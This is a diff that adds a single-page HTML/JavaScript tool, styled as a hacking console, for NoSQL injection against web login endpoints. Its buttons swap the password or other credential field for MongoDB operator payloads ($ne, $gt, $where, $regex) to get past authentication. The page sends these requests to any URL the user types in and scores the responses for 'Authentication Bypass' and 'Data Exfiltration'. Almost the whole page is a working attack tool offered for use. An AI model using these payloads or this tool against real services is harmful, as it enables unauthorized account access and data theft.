@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>NoSQL Injection Payloads</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #000;
+      color: #c58b00;
+      overflow-x: hidden;
+    }
+    video#bg-video {
+      position: fixed;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      min-width: 100vw; min-height: 100vh;
+      object-fit: cover;
+      z-index: -2;
+      opacity: 0.25;
+    }
+    audio#bg-music {
+      position: fixed;
+      z-index: -1;
+      opacity: 0;
+      pointer-events: none;
+    }
+    .container {
+      max-width: 900px;
+      margin: 50px auto;
+      padding: 25px;
+      border-radius: 12px;
+      background: rgba(0, 0, 0, 0.2);
+    }
+    h1, label {
+      color: #c58b00;
+      text-shadow: 1px 1px 3px black;
+    }
+    input[type="text"], textarea, select {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      background: rgba(0, 0, 0, 0.3);
+      color: #c58b00;
+      border: 1px solid #c58b00;
+      border-radius: 5px;
+      font-size: 1rem;
+    }
+    .row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+    }
+    button {
+      background: rgba(0, 0, 0, 0.4);
+      border: 1px solid #c58b00;
+      color: #c58b00;
+      padding: 10px 15px;
+      margin: 5px 5px 15px 0;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: 0.2s ease;
+    }
+    button:hover {
+      background: rgba(255, 255, 255, 0.1);
+      color: red;
+    }
+    pre {
+      white-space: pre-wrap;
+      background: rgba(0, 0, 0, 0.3);
+      padding: 10px;
+      border: 1px solid red;
+      color: #00ffcc;
+      margin: 10px 0;
+      border-radius: 5px;
+      max-height: 340px;
+      overflow-y: auto;
+    }
+    .history { margin-top: 20px; }
+    .history-item {
+      border-bottom: 1px solid red;
+      padding: 5px;
+      font-size: 0.9rem;
+      color: #ff8800;
+    }
+    .hint { font-size: 0.88rem; opacity: 0.9; color: #ffb74d; }
+    @media (max-width: 768px) {
+      .container { margin: 20px 10px; padding: 15px; }
+      .row { grid-template-columns: 1fr; }
+      button { width: 100%; margin: 8px 0; }
+    }
+  </style>
+</head>
+<body>
+  <!-- Background Video -->
+  <video id="bg-video" autoplay muted loop playsinline>
+    <source src="background/1761817527453041720p.mp4" type="video/mp4" />
+    Your browser does not support the video tag.
+  </video>
+  <!-- Background Music -->
+  <audio id="bg-music" loop>
+    <source src="background/Programming___Coding___Hacking_music_vol.18__ANONYMOUS_HEADQUARTERS_(48k).mp3" type="audio/mpeg" />
+    Your browser does not support the audio tag.
+  </audio>
+  <div class="container">
+    <h1>🛡️ NoSQL Injection Payloads</h1>
+    <label>Target URL:</label>
+    <input type="text" id="url" placeholder="https://api.example.com/v1/login" />
+    <div class="row">
+      <div>
+        <label>HTTP Method:</label>
+        <select id="method">
+          <option>POST</option>
+          <option>GET</option>
+          <option>PUT</option>
+          <option>PATCH</option>
+          <option>DELETE</option>
+        </select>
+      </div>
+      <div>
+        <label>Request Timeout (ms):</label>
+        <input type="text" id="timeout" placeholder="8000" value="8000" />
+      </div>
+    </div>
+    <label>Request Headers (JSON):</label>
+    <textarea id="headers" rows="5" placeholder='{"Accept":"application/json","Content-Type":"application/json"}'></textarea>
+    <label>Request Body (JSON):</label>
+    <textarea id="body" rows="6" placeholder='{"username":"test","password":"test"}'></textarea>
+    <div class="row">
+      <button onclick="sendRequest()">Send Request</button>
+      <button onclick="analyzeResponse()">Analyze Response</button>
+    </div>
+    <div class="row">
+      <button onclick="injectPayload('true', '$where')">True Payload ($where)</button>
+      <button onclick="injectPayload('admin', '$ne')">Admin Payload ($ne)</button>
+    </div>
+    <div class="row">
+      <button onclick="injectPayload('', '$gt')">Empty Password ($gt)</button>
+      <button onclick="injectPayload({'$regex': '.*'}, '$regex')">Regex Bypass</button>
+    </div>
+    <div class="row">
+      <button onclick="copyResult()">Copy Result</button>
+      <button onclick="clearAll()">Clear</button>
+    </div>
+    <div class="hint">Note: Browser CORS and mixed-content rules apply. Use endpoints that allow cross-origin requests for full results.</div>
+    <label>Result:</label>
+    <pre id="result-box">No result yet...</pre>
+    <div class="history">
+      <h3>History</h3>
+      <div id="history-box"></div>
+    </div>
+  </div>
+  <script>
+    const music = document.getElementById("bg-music");
+    const resultBox = document.getElementById("result-box");
+    const historyBox = document.getElementById("history-box");
+    let history = [];
+    let lastResponse = null;
+    
+    window.addEventListener('click', () => {
+      music.play().catch(() => {});
+    }, { once: true });
+    
+    function parseJSON(text, fallback = {}) {
+      try { return text ? JSON.parse(text) : fallback; } catch { return null; }
+    }
+    
+    function injectPayload(payload, operator) {
+      const method = document.getElementById("method").value;
+      const bodyEl = document.getElementById("body");
+      const parsed = parseJSON(bodyEl.value, {});
+      
+      if (parsed === null) {
+        alert("Body is not valid JSON. Fix it first.");
+        return;
+      }
+      
+      // Find the most likely field to inject (usually password or similar)
+      let targetField = 'password';
+      if (!parsed[targetField]) {
+        // Find a field that might be a credential
+        const fields = Object.keys(parsed);
+        const credentialFields = fields.filter(f => 
+          f.toLowerCase().includes('pass') || 
+          f.toLowerCase().includes('secret') || 
+          f.toLowerCase().includes('key')
+        );
+        
+        if (credentialFields.length > 0) {
+          targetField = credentialFields[0];
+        } else if (fields.length > 1) {
+          targetField = fields[1]; // Use second field if no obvious credential field
+        } else {
+          targetField = fields[0]; // Use first field as fallback
+        }
+      }
+      
+      // Apply the appropriate injection based on operator
+      switch(operator) {
+        case '$where':
+          parsed[targetField] = { "$where": `return ${payload}` };
+          break;
+        case '$ne':
+          parsed[targetField] = { "$ne": payload };
+          break;
+        case '$gt':
+          parsed[targetField] = { "$gt": "" };
+          break;
+        case '$regex':
+          parsed[targetField] = payload;
+          break;
+        default:
+          parsed[targetField] = payload;
+      }
+      
+      bodyEl.value = JSON.stringify(parsed, null, 2);
+      logHistory(document.getElementById("url").value, `Injected ${operator} payload`);
+    }
+    
+    async function sendRequest() {
+      const url = document.getElementById("url").value.trim();
+      const method = document.getElementById("method").value;
+      const timeout = parseInt(document.getElementById("timeout").value, 10) || 8000;
+      const headersRaw = document.getElementById("headers").value;
+      const bodyRaw = document.getElementById("body").value;
+      
+      if (!url) { 
+        resultBox.textContent = "❌ URL is required."; 
+        return; 
+      }
+      
+      const headers = parseJSON(headersRaw, {});
+      if (headers === null) { 
+        resultBox.textContent = "❌ Headers must be valid JSON."; 
+        return; 
+      }
+      
+      let body = undefined;
+      if (["POST","PUT","PATCH"].includes(method)) {
+        const parsed = parseJSON(bodyRaw, {});
+        if (parsed === null) { 
+          resultBox.textContent = "❌ Body must be valid JSON."; 
+          return; 
+        }
+        body = JSON.stringify(parsed);
+        if (!headers["Content-Type"]) headers["Content-Type"] = "application/json";
+      }
+      
+      const controller = new AbortController();
+      const timer = setTimeout(() => controller.abort(), timeout);
+      const start = performance.now();
+      
+      let text = "", status = -1, statusText = "", size = 0;
+      let ok = false, headersObj = {};
+      
+      try {
+        const res = await fetch(url, { 
+          method, 
+          headers, 
+          body, 
+          signal: controller.signal, 
+          mode: "cors" 
+        });
+        
+        clearTimeout(timer);
+        status = res.status; 
+        statusText = res.statusText; 
+        ok = res.ok;
+        
+        res.headers.forEach((v, k) => { headersObj[k] = v; });
+        
+        // Read as text to measure size quickly
+        text = await res.text();
+        size = new Blob([text]).size;
+        
+        // Store response for analysis
+        lastResponse = {
+          status,
+          statusText,
+          ok,
+          headers: headersObj,
+          body: text,
+          size,
+          time: Math.round(performance.now() - start)
+        };
+        
+      } catch (e) {
+        clearTimeout(timer);
+        resultBox.textContent = `❌ Request failed: ${e.message}\nTip: If it's a CORS error, the browser blocked the response.`;
+        logHistory(url, "Request failed");
+        return;
+      }
+      
+      const ms = Math.round(performance.now() - start);
+      const summary = {
+        request: { url, method, timeout, headers },
+        response: {
+          status, 
+          statusText, 
+          ok,
+          time_ms: ms,
+          size_bytes: size,
+          headers: headersObj,
+          body_preview: text.slice(0, 1000)
+        }
+      };
+      
+      resultBox.textContent = JSON.stringify(summary, null, 2);
+      logHistory(url, `Status ${status} in ${ms} ms`);
+    }
+    
+    function analyzeResponse() {
+      if (!lastResponse) {
+        resultBox.textContent = "❌ No response to analyze. Send a request first.";
+        return;
+      }
+      
+      const analysis = {
+        response_summary: {
+          status: lastResponse.status,
+          status_text: lastResponse.statusText,
+          response_time: `${lastResponse.time}ms`,
+          size: `${lastResponse.size} bytes`
+        },
+        potential_indicators: []
+      };
+      
+      // Analyze response for potential NoSQL injection indicators
+      const body = lastResponse.body;
+      
+      // Check for successful authentication with payload
+      if (lastResponse.status === 200 && body) {
+        const parsedBody = parseJSON(body);
+        
+        if (parsedBody) {
+          // Look for tokens, user data, or authentication success
+          if (parsedBody.token || parsedBody.user || parsedBody.success === true) {
+            analysis.potential_indicators.push({
+              indicator: "Authentication Bypass",
+              confidence: "High",
+              description: "Received authentication data with potential NoSQL injection payload"
+            });
+          }
+          
+          // Look for unusually large data sets
+          if (Array.isArray(parsedBody) && parsedBody.length > 100) {
+            analysis.potential_indicators.push({
+              indicator: "Data Exfiltration",
+              confidence: "Medium",
+              description: `Received large dataset with ${parsedBody.length} items`
+            });
+          }
+          
+          // Look for error messages that might reveal database info
+          if (parsedBody.error && typeof parsedBody.error === 'string') {
+            const errorMsg = parsedBody.error.toLowerCase();
+            if (errorMsg.includes('mongodb') || errorMsg.includes('nosql') || 
+                errorMsg.includes('bson') || errorMsg.includes('document')) {
+              analysis.potential_indicators.push({
+                indicator: "Database Information Leak",
+                confidence: "High",
+                description: "Error message reveals database technology"
+              });
+            }
+          }
+        }
+      }
+      
+      // Check for error responses that might indicate injection success
+      if (lastResponse.status >= 400 && lastResponse.status < 500) {
+        if (body && body.toLowerCase().includes('syntax error')) {
+          analysis.potential_indicators.push({
+            indicator: "Injection Syntax Error",
+            confidence: "Medium",
+            description: "Server responded with syntax error - possible injection point"
+          });
+        }
+      }
+      
+      // If no indicators found
+      if (analysis.potential_indicators.length === 0) {
+        analysis.potential_indicators.push({
+          indicator: "No obvious indicators",
+          confidence: "Low",
+          description: "Response doesn't show clear signs of NoSQL injection success"
+        });
+      }
+      
+      resultBox.textContent = JSON.stringify(analysis, null, 2);
+      logHistory(document.getElementById("url").value, "Response analyzed");
+    }
+    
+    function copyResult() {
+      const text = resultBox.textContent;
+      if (!text || text === "No result yet...") return alert("Nothing to copy!");
+      navigator.clipboard.writeText(text).then(() => alert("Result copied!"));
+    }
+    
+    function clearAll() {
+      document.getElementById("url").value = "";
+      document.getElementById("method").value = "POST";
+      document.getElementById("timeout").value = "8000";
+      document.getElementById("headers").value = "";
+      document.getElementById("body").value = "";
+      resultBox.textContent = "No result yet...";
+      lastResponse = null;
+    }
+    
+    function logHistory(target, snippet) {
+      const time = new Date().toLocaleTimeString();
+      const line = `${time} - ${target}: ${snippet}`;
+      history.unshift(line);
+      updateHistory();
+    }
+    
+    function updateHistory() {
+      historyBox.innerHTML = "";
+      history.slice(0, 8).forEach(entry => {
+        const div = document.createElement("div");
+        div.className = "history-item";
+        div.textContent = entry;
+        historyBox.appendChild(div);
+      });
+    }
+  </script>
+</body>
+</html>
